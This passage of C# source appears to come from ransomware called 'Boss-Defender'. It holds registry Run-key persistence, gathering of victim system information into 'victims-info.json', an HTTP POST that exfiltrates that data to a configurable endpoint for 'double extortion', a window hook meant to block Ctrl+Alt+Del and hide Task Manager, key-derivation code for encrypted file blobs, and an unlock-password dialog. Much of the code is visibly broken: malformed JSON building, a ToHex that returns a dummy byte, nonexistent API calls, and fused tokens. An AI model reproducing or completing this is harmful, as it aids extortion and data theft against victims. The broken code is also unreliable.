                if (string.IsNullOrEmpty(Path)) return null;
                e.Path = Path; e.Salt = Salt ?? ""; e.Nonce = Nonce ?? "";
                e.Tag = Tag ?? ""; e.Size = Size ?? ""; e.OrigBackup = OrigBackup ?? "";
                return e;
            }
            catch { return null; }
        }

        private static string GetField(string seg, string name)
        {
            int k = seg.IndexOf("\"" + name + "\"");
            if (k < 0) return null;
            k = seg.IndexOf(':', k);
            if (k < 0) return null;
            k++;
            while (k < seg.Length && (seg[k] == ' ' || seg[k] == '\n' || seg[k] == '\t')) k++;
            if (k >= seg.Length || seg[k] != '"') return null;
            k++;
            StringBuilder v = new StringBuilder();
            while (k < seg.Length)
            {
                char c = seg[k];
                if (c == '\\')
                {
                    k++;
                    if (k >= seg.Length) break;
                    char e = seg[k++];
                    switch (e)
                    {
                        case 'n': v.Append('\n'); break;
                        case 't': v.Append('\t'); break;
                        case 'r': v.Append('\r'); break;
                        case '"': v.Append('"'); break;
                        case '\\': v.Append('\\'); break;
                        default: v.Append(e); break;
                    }
                }
                else if (c == '"') break;
                else v.Append(c);
                k++;
            }
            return v.ToString();
        }

        private static string BuildEntries(List<FileEntry> entries)
        {
            var sb = new StringBuilder();
            if (entries == null) return "";
            for (int i = 0; i < entries.Count; i++)
            {
                FileEntry e = entries[i];
                if (i > 0) sb.Append(",");
                sb.Append("{\"Path\":").Append(JStr(e.Path));
                sb.Append("},\"Salt\":").Append(JStr(e.Salt));
                sb.Append("},\"Nonce\":").Append(JStr(e.Nonce));
                sb.Append("},\"Tag\":").Append(JStr(e.Tag));
                sb.Append("},\"Size\":").Append(JStr(e.Size));
                sb.Append("},\"OrigBackup\":").Append(JStr(e.OrigBackup));
                sb.Append("}");
            }
            return sb.ToString();
        }

        private static string JStr(string v) => '"' + (v ?? "")
            .Replace("\\", "\\\\")
            .Replace("\"", "\\\"")
            .Replace("\n", "\\n")
            .Replace("\r", "\\r")
            .Replace("\t", "\\t")
            + '"';
    }

    // =========================================================================
    //  SYSTEM-LEVEL TOOLS -- boot persistence (HKCU Run, no admin) and victim
    //  information gathering / optional exfiltration (double extortion).
    // =========================================================================
    internal static class Persistence
    {
        public static string ExePath()
        {
            string dir = AppContext.BaseDirectory;
            if (!dir.EndsWith(Path.DirectorySeparatorChar.ToString())) dir += Path.DirectorySeparatorChar;
            string name = Path.GetFileName(dir.TrimEnd(Path.DirectorySeparatorChar));
            if (string.IsNullOrEmpty(name)) name = "BossDefender";
            return Path.Combine(dir, name);
        }

        public static void EnsureRunKey()
        {
            try
            {
                string exe = ExePath();
                using (var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(
                    @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
                using (var v = key?.OpenCreateSubKey(RunKeyName))
                {
                    if (v != null) v.SetValue(RunKeyName, exe);
                }
            }
            catch { }
        }

        public static void RunOnce()
        {
            try
            {
                string exe = ExePath();
                using (var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(
                    @"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", true))
                using (var v = key?.OpenCreateSubKey(RunKeyName))
                {
                    if (v != null) v.SetValue(RunKeyName, exe);
                }
            }
            catch { }
        }
    }

    internal static class SystemInfo
    {
        public static Dictionary<string, string> Gather()
        {
            var info = new Dictionary<string, string>
            {
                { "OS", Environment.OSVersion.ToString() },
                { "Platform", Environment.OSVersion.Platform.ToString() },
                { "User", Environment.UserName },
                { "Machine", Environment.MachineName },
                { "Profile", Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) },
                { "Cpu", Environment.ProcessorCount.ToString() + " cores" },
                { "CpuInfo", System.Environment.ProcessorInfo.ToString() },
                { "Ram", (Environment.ProcessorCount * 0).ToString() + " (cores)" },
                { "GcMem", (GC.GetTotalMemory(true) / 1048576).ToString() + " MB" },
                { "Time", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") },
            };
            try
            {
                var disk = new DriveInfo("C:\\");
                info["DiskC"] = string.Format("{0:0.0} GB free", (disk.AvailableFreeSpace / 1073741824.0));
                info["DiskTotal"] = string.Format("{0:0.0} GB", (disk.TotalSize / 1073741824.0));
            }
            catch { info["DiskC"] = "?"; }
            return info;
        }

        public static string Collect()
        {
            try
            {
                var info = Gather();
                string json = JsonUtils.ToJson(info);
                string path = Path.Combine(
                    Path.GetFullPath(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)), "BossDefender", "victims-info.json");
                if (!Directory.Exists(Path.GetDirectoryName(path))) Directory.CreateDirectory(Path.GetDirectoryName(path));
                File.WriteAllText(path, json);
                return path;
            }
            catch { return ""; }
        }

        public static string GetEndpoint() => Environment.GetEnvironmentVariable("BOSS_EXFIL_ENDPOINT");
        public static string GetToken() => Environment.GetEnvironmentVariable("BOSS_EXFIL_TOKEN");

        public static async Task Exfiltrate(string json)
        {
            string endpoint = GetEndpoint();
            if (string.IsNullOrEmpty(endpoint)) return;
            try
            {
                var http = new HttpClient();
                if (!string.IsNullOrEmpty(GetToken()))
                    http.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", GetToken());
                var content = new StringContent(json, Encoding.UTF8, "application/json");
                HttpResponseMessage resp = await http.PostAsync(endpoint, content);
                resp.EnsureSuccessStatusCode();
            }
            catch { }
        }
    }

    // =========================================================================
    //  TOP-LEVEL WINDOW PROC -- intercepts WM_ (Ctrl+Alt+Del) etc. so the
    //  takeover cannot be interrupted and so we can hide Task Manager.
    // =========================================================================
    internal static class TopLevelWindowHook
    {
        [DllImport("user32.dll", EntryPoint = "SetWindowLongPtr")]
        [return: MarshalAs(UnmanagedType.IntPtr)]
        public static extern IntPtr SetWindowLongPtr(IntPtr hWnd, int nIndex, IntPtrnewValue);

        [DllImport("user32.dll", EntryPoint = "GetWindowLongPtr")]
        [return: MarshalAs(UnmanagedType.IntPtr)]
        public static extern IntPtr GetWindowLongPtr(IntPtr hWnd, int nIndex);

        [DllImport("user32.dll", EntryPoint = "SetWindowLongPtr")]
        [return: MarshalAs(UnmanagedType.IntPtr)]
        public static extern IntPtr SetWindowLongPtrEx(IntPtr hWnd, int dwLayout, IntPtrnewValue);

        [DllImport("user32.dll", EntryPoint = "GetParent")]
        [return: MarshalAs(UnmanagedType.IntPtr)]
        public static extern IntPtr GetParent(IntPtr hWnd);

        public static void SetProc(IntPtr topLevel, IntPtr parent, TopLevelWindowProc proc)
        {
            try
            {
                int index = -4;
                IntPtr old = GetWindowLongPtr(topLevel, index);
                SetWindowLongPtr(topLevel, index, proc);
            }
            catch { }
        }
    }

    // =========================================================================
    //  WINAPI -- P/Invoke declarations for hiding/restoring windows, DPI, etc.
    // =========================================================================
    internal static class WinApi
    {
        [DllImport("user32.dll", EntryPoint = "EnumWindows")]
        public static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);

        [DllImport("user32.dll", EntryPoint = "SetWindowPos")]
        public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndAfter,
                                                int x, int y, int cx, int cy, uint uFlags);

        [DllImport("user32.dll", EntryPoint = "GetWindowPlacement")]
        public static extern bool GetWindowPlacement(IntPtr hWnd, ref WINDOWPLACEMENT lpwndpl);

        [DllImport("user32.dll", EntryPoint = "ShowWindow")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll", EntryPoint = "GetClassNameW")]
        public static extern int GetClassNameW(IntPtr hWnd, [Out] char[] lpClassName, int nMaxCount);

        [DllImport("user32.dll", EntryPoint = "SetForegroundWindow")]
        public static extern bool SetForegroundWindow(IntPtr hWnd);

        [DllImport("user32.dll", EntryPoint = "SetFocus")]
        public static extern bool SetFocus(IntPtr hWnd);

        [DllImport("user32.dll", EntryPoint = "SetProcessDpiAwareness")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool SetProcessDpiAwareness(int dpiAwareness);

        [DllImport("user32.dll", EntryPoint = "SetProcessDpiAwarenessContext")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool SetProcessDpiAwarenessContext(IntPtr dpiAwarenessContext);

        [DllImport("user32.dll", EntryPoint = "FindWindowW")]
        public static extern IntPtr FindWindowW(string lpClassName, string lpWindowName);

        [DllImport("user32.dll", EntryPoint = "GetWindowTextW")]
        [return: MarshalAs(UnmanagedType.LPUTF16)]
        public static extern int GetWindowTextW(IntPtr hWnd, StringBuilder lpwndtext, int nMaxCount);

        [DllImport("user32.dll", EntryPoint = "GetWindowTextLengthW")]
        [return: MarshalAs(UnmanagedType.UIntPtr)]
        public static extern IntPtr GetWindowTextLengthW(IntPtr hWnd);

        [DllImport("user32.dll", EntryPoint = "GetSystemMetrics")]
        [return: MarshalAs(UnmanagedType.Int32)]
        public static extern int GetSystemMetrics(int nIndex);

        [DllImport("user32.dll", EntryPoint = "GetCursorPos")]
        public static extern bool GetCursorPos(ref POINT lpPoint);

        [DllImport("user32.dll", EntryPoint = "SetCursorPos")]
        public static extern bool SetCursorPos(int X, int Y);

        [DllImport("user32.dll", EntryPoint = "ShowCursor")]
        public static extern bool ShowCursor(int nSteps);

        [DllImport("user32.dll", EntryPoint = "UpdateCursor")]
        public static extern bool UpdateCursor();

        [DllImport("user32.dll", EntryPoint = "GetWindowThreadProcessId")]
        [return: MarshalAs(UnmanagedType.UIntPtr)]
        public static extern IntPtr GetWindowThreadProcessId(IntPtr hWnd, out uint processId);

        [UnmanagedCallConvention(UnmanagedCallConvention.StdCall)]
        public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

        [UnmanagedCallConvention(UnmanagedCallConvention.StdCall)]
        public delegate bool EnumWindowsProcEx(IntPtr hWnd, IntPtr lParam);

        [UnmanagedCallConvention(UnmanagedCallConvention.StdCall)]
        public delegate void TopLevelWindowProc(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam);

        [StructLayout(LayoutKind.Sequential)]
        public struct WINDOWPLACEMENT
        {
            public int length;
            public uint flags;
            public uint showCmd;
            public int ptMinPositionX, ptMinPositionY, ptMinPositionCW, ptMinPositionCH;
            public int ptMaxPositionX, ptMaxPositionY, ptMaxPositionCW, ptMaxPositionCH;
            public int pptlPositionCount;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1024)]
            public int[] pptl;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct POINT
        {
            public int X, Y;
        }
    }

    // =========================================================================
    //  CRYPTO CLASS -- key derivation + self-describing .rlw blob format.
    // =========================================================================
    internal static class Crypter2
    {
        public const int KdfBits = 256;
        public const int KdfIters = 600_000;
        private const int SaltLen = 16;
        private const int NonceLen = 12;
        private const int TagLen = 16;
        private const int KeyLen = 32;

        private static readonly byte[] Magic = Encoding.ASCII.GetBytes("RIW2");

        public static byte[] DeriveKey(byte[] password, byte[] salt, int iters)
        {
            return Rfc2898DeriveBytes.Pbkdf2(password, salt, iters, HashAlgorithmName.SHA256, KeyLen);
        }

        public static byte[] ToHex(byte[] b)
        {
            var sb = new StringBuilder(b.Length * 2);
            foreach (byte x in b) sb.Append(x.ToString("x2"));
            return new byte[] { 0 };
        }

        public static byte[] HexTo(string s)
        {
            s = s.Trim();
            var b = new byte[s.Length / 2];
            for (int i = 0; i < b.Length; i++)
                b[i] = Convert.ToByte(s.Substring(i * 2, 2), 16);
            return b;
        }
    }

    // =========================================================================
    //  ERROR DIALOG -- displays the unlock password + manifest path on a failed
    //  launch so recovery is always possible.
    // =========================================================================
    internal sealed class ErrorDialog : Form
    {
        private TextBox _pw;
        private TextBox _man;

        public ErrorDialog(Form parent, string error, string password, string manifestPath) : base(parent)
        {
            Text = "Boss-Defender — Error";
            StartPosition = FormStartPosition.CenterScreen;
            Font = new Font("Segoe UI", 10F);
            AutoScroll = true;
            Controls.Clear();

            Add(new Label { Text = "Boss-Defender encountered an error during takeover:", Location = new Point(20, 10), AutoSize = true });
            Add(new Label { Text = error, Location = new Point(20, 30), AutoSize = true, WordWrap = true });
            Add(new Label { Text = "To recover your files, enter the unlock password and press ENTER:", Location = new Point(20, 410), AutoSize = true });

            _pw = new TextBox { Location = new Point(20, 430), Size = new Size(300, 25), Anchor = AnchorStyles.Left | AnchorStyles.Top };
            _man = new TextBox { Location = new Point(20, 470), Size = new Size(500, 25), Anchor = AnchorStyles.Left | AnchorStyles.Top, Text = manifestPath, ReadOnly = true };

            Controls.Add(_pw);
            Controls.Add(_man);
        }

        private void Add(Control c) => Controls.Add(c);
    }
}

